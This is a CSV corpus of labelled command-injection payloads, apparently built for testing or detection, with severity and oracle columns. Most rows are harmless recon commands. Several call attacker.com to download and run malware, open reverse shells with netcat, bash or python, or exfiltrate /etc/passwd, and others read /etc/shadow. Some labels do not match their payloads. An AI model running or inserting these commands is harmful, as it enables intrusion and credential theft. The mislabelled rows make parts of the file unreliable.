id,label,attack_class,type,payload,context,context_bucket,severity,severity_original,severity_reason,is_destructive,destructive_flags,oracle,description,example
cmdinj-010,attack,cmdi,Command Injection,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute malware,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and wget,
cmdinj-011,attack,cmdi,Command Injection,| nc attacker.com 4444 -e /bin/sh,Reverse shell via netcat,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with pipe and netcat reverse shell,
cmdinj-012,attack,cmdi,Command Injection,whoami,Execute whoami command,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with backticks and whoami,
cmdinj-013,attack,cmdi,Command Injection,$(id),Execute id command,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with $() and id,
cmdinj-014,attack,cmdi,Command Injection,; echo injected,Simple echo injection,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and echo,
cmdinj-015,attack,cmdi,Command Injection,&& cat /etc/shadow,Read shadow file,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with && and cat /etc/shadow,
cmdinj-016,attack,cmdi,Command Injection,; id,Execute id command,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with semicolon and id,
cmdinj-017,attack,cmdi,Command Injection,| env,Print environment variables,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with pipe and env,
cmdinj-018,attack,cmdi,Command Injection,ls /,List root directory,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with backticks and ls,
cmdinj-019,attack,cmdi,Command Injection,$(ps aux),List running processes,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with $() and ps,
cmdinj-020,attack,cmdi,Command Injection,; whoami,Execute whoami command,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with semicolon and whoami,
cmdinj-021,attack,cmdi,Command Injection,%3B%20id,URL encoded semicolon and id command,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with URL encoding,
cmdinj-022,attack,cmdi,Command Injection,`echo \whoami\`,Nested backticks execution,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with nested backticks,
cmdinj-023,attack,cmdi,Command Injection,; echo $USER,Print current user environment variable,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with environment variable,
cmdinj-024,attack,cmdi,Command Injection,; echo\x20injected,Hex encoded space character,script_context,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with hex encoded characters,
cmdinj-025,attack,cmdi,Command Injection,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with base64 encoded command,
cmdinj-026,attack,cmdi,Command Injection,$(sleep 10),Timing attack with sleep,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with command substitution and sleep,
cmdinj-027,attack,cmdi,Command Injection,; echo $(whoami),Nested command substitution,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and nested $(),
cmdinj-028,attack,cmdi,Command Injection,; echo injected\; ls,Escape semicolon,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with backslash escaping,
cmdinj-029,attack,cmdi,Command Injection,; ls -la && whoami || echo failed,Multiple command chaining,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with multiple command separators,
cmdinj-030,attack,cmdi,Command Injection,; (id; uname -a),Grouped commands,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with command grouping,
cmdinj-031,attack,cmdi,Command Injection,; (sleep 5),Subshell with sleep,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with subshell,
cmdinj-032,attack,cmdi,Command Injection,; ls -la #,Command injection with comment,command_exec,high,medium,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Command injection with command chaining and comments,
cmdinj-033,attack,cmdi,Command Injection,echo $(whoami),Nested command execution,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with backticks and nested $(),
cmdinj-034,attack,cmdi,Command Injection,; echo $PATH,Print PATH environment variable,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and environment variable expansion,
cmdinj-035,attack,cmdi,Command Injection,$(echo injected),Echo injected string,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with command substitution and echo,
cmdinj-036,attack,cmdi,Command Injection,; (echo injected; whoami),Multiple commands in subshell,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and nested subshell,
cmdinj-037,attack,cmdi,Command Injection,; sleep 15,Timing attack,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and sleep for timing,
cmdinj-040,attack,cmdi,Command Injection,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Download and execute script,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and curl download,
cmdinj-042,attack,cmdi,Command Injection,; export MALICIOUS=1,Set environment variable,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and environment variable manipulation,
cmdinj-043,attack,cmdi,Command Injection,; echo 'malicious' > /tmp/malicious.txt,Write to file,command_exec,critical,medium,base cmdi/Command Injection=critical; destructive ['file_write'] -> critical,True,['file_write'],marker_reflection,Command injection with semicolon and echo to file,
cmdinj-044,attack,cmdi,Command Injection,; chmod +x /tmp/m.sh,Change file permissions,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and chmod,
cmdinj-045,attack,cmdi,Command Injection,; cat /etc/shadow,Read shadow file,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and cat /etc/shadow,
cmdinj-046,attack,cmdi,Command Injection,; echo 'injected; ls -la',Echo with special characters,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and echo with special characters,
cmdinj-047,attack,cmdi,Command Injection,"; echo ""$(whoami)""",Nested command with quotes,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and nested command with quotes,
cmdinj-048,attack,cmdi,Command Injection,"; awk 'BEGIN {system(""id"")}'",Execute command via awk,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and awk command,
cmdinj-049,attack,cmdi,Command Injection,; perl -e 'print id',Execute command via perl,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and perl command,
cmdinj-050,attack,cmdi,Command Injection,"; python -c 'import os; os.system(""id"")'",Execute command via python,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Command injection with semicolon and python command,
cmdinj-051,attack,cmdi,Command Injection,& whoami,Execute whoami command,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,Windows cmd injection with & separator,
cmdinj-052,attack,cmdi,Command Injection,| dir,List directory contents,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with | separator,
cmdinj-053,attack,cmdi,Command Injection,&& ipconfig,Display network config,other,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with && separator,
cmdinj-054,attack,cmdi,Command Injection,|| net user,List users,other,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with || separator,
cmdinj-055,attack,cmdi,Command Injection,; Get-Process,List running processes,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with semicolon,
cmdinj-057,attack,cmdi,Command Injection,$(Get-ChildItem),List directory contents,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with $(),
cmdinj-058,attack,cmdi,Command Injection,; Start-Process notepad.exe,Launch notepad,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with Start-Process,
cmdinj-059,attack,cmdi,Command Injection,& echo injected > C:\Windows\Temp\injected.txt,Write to file,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with echo to file,
cmdinj-060,attack,cmdi,Command Injection,& nc attacker.com 4444 -e cmd.exe,Reverse shell,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with netcat reverse shell,
cmdinj-062,attack,cmdi,Command Injection,| id,Execute id,command_exec,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,macOS/Linux injection with pipe and id,
cmdinj-063,attack,cmdi,Command Injection,&& uname -a,System info,other,high,high,base cmdi/Command Injection=critical; read-only recon command -> high,False,[],marker_reflection,macOS/Linux injection with && and uname,
cmdinj-069,attack,cmdi,Command Injection,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=,Encoded PowerShell command,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with encoded command,
cmdinj-070,attack,cmdi,Command Injection,"& for /L %i in (1,1,5) do @echo %i",Loop command,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with for loop,
cmdinj-071,attack,cmdi,Command Injection,; Invoke-Expression 'whoami',Execute command,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with Invoke-Expression,
cmdinj-072,attack,cmdi,Command Injection,; env,Print environment variables,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and env,
cmdinj-073,attack,cmdi,Command Injection,; cat /etc/passwd,Read passwd file,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and cat /etc/passwd,
cmdinj-074,attack,cmdi,Command Injection,& reg query HKLM\Software,Query registry,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with reg query,
cmdinj-075,attack,cmdi,Command Injection,; Get-Content C:\Windows\System32\drivers\etc\hosts,Read hosts file,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with Get-Content,
cmdinj-076,attack,cmdi,Command Injection,; dmesg,Kernel messages,comment_field,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and dmesg,
cmdinj-077,attack,cmdi,Command Injection,; netstat -an,Network connections,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and netstat,
cmdinj-078,attack,cmdi,Command Injection,& tasklist,List running tasks,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with tasklist,
cmdinj-079,attack,cmdi,Command Injection,; Get-Service,List services,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with Get-Service,
cmdinj-080,attack,cmdi,Command Injection,; ps aux,List processes,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and ps aux,
cmdinj-081,attack,cmdi,Command Injection,& echo injected | findstr injected,Echo and filter output,other,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with echo and pipe,
cmdinj-082,attack,cmdi,Command Injection,; Start-Process notepad.exe -WindowStyle Hidden,Launch process hidden,command_exec,critical,medium,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with Start-Process and hidden window,
cmdinj-083,attack,cmdi,Command Injection,; curl http://attacker.com/?data=$(cat /etc/passwd),Exfiltrate data via curl,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and curl to exfiltrate data,
cmdinj-084,attack,cmdi,Command Injection,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Encoded PowerShell payload,command_exec,critical,high,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with powershell encoded command,
cmdinj-085,attack,cmdi,Command Injection,; nc attacker.com 4444 -e /bin/bash,Reverse shell via netcat,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and nc reverse shell,
cmdinj-086,attack,cmdi,Command Injection,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Download and execute file,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with certutil download,
cmdinj-087,attack,cmdi,Command Injection,; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Reverse shell via bash,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and bash reverse shell,
cmdinj-088,attack,cmdi,Command Injection,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Download and execute PowerShell script,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows PowerShell injection with Invoke-WebRequest,
cmdinj-089,attack,cmdi,Command Injection,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Reverse shell via python,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,macOS/Linux injection with semicolon and python reverse shell,
cmdinj-090,attack,cmdi,Command Injection,& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==,Encoded PowerShell reverse shell,command_exec,critical,critical,base cmdi/Command Injection=critical,False,[],marker_reflection,Windows cmd injection with powershell encoded reverse shell,
